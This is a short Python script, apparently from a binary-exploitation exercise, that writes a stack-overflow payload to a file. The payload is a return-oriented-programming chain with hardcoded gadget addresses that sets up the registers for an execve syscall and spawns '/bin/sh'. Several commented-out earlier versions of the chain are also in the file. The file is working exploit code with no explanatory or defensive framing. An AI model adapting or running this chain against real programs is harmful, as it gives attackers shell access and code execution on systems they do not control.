import struct

with open('programInput.txt', 'w') as f:
	# f.write(72*'A' + struct.pack("<Q",0x400663) + struct.pack("<Q", 0x0) + struct.pack("<Q", 0x400661) + struct.pack("<Q",0x0) + struct.pack("<Q",0x0) + struct.pack("<Q",0x7FFFF7A70222) + struct.pack("<Q",0x16))
#	f.write('/bin/sh'+struct.pack("<Q",0x0)+57*'A' + struct.pack("<Q",0x400663) + struct.pack("<Q", 0x7fffffffe530) + struct.pack("<Q", 0x400661) + struct.pack("<Q",0x0) + struct.pack("<Q",0x0) + struct.pack("<Q",0x7FFFF7A12B8E) + struct.pack("<Q",0x0) + struct.pack("<Q",0x7ffff7ad6130))
	strn = '/bin/sh'
	strn += struct.pack("<Q",0x0)
	strn += 57*'A'
	strn += struct.pack("<Q",0x400663) # RA of rdi
	strn += struct.pack("<Q", 0x7fffffffe530) # value of /bin/sh
	strn += struct.pack("<Q", 0x400661) # RA of rsi
	strn += struct.pack("<Q",0x0) # value of null 
	strn += struct.pack("<Q",0x0) # value of null for random register
	strn += struct.pack("<Q",0x7FFFF7A12B8E) # RA of rdx
	strn += struct.pack("<Q",0x0) # value of null
	strn += struct.pack("<Q",0x7ffff7a597a8) # RA for rax
	strn += struct.pack("<Q", 0x3b) # value of 59 for rax
#	strn += struct.pack("<Q",0x0) # value of null for random register
#	strn += struct.pack("<Q",0x0) # value of null for random register
	strn += struct.pack("<Q",0x7ffff7b1cd57) #syscall instruction
	f.write(strn)

	#f.write('/bin/sh'+struct.pack("<Q",0x0)+57*'A' + struct.pack("<Q",0x400663) + struct.pack("<Q", 0x7fffffffe530) + struct.pack("<Q", 0x400661) + struct.pack("<Q",0x0) + struct.pack("<Q",0x0) + struct.pack("<Q",0x7FFFF7A12B8E) + struct.pack("<Q",0x0) + struct.pack("<Q",0x487a8)+ struct.pack("<Q", 0x3b) + struct.pack("<Q",0xc5c55))

#	f.write('./a.out'+struct.pack("<Q",0x0)+57*'A' + struct.pack("<Q",0x400663) + '/bin/sh\0' + struct.pack("<Q", 0x400661) + struct.pack("<Q",0x0) + struct.pack("<Q",0x0) + struct.pack("<Q",0x7FFFF7A12B8E) + struct.pack("<Q",0x0) + struct.pack("<Q",0x7ffff7ad6130))
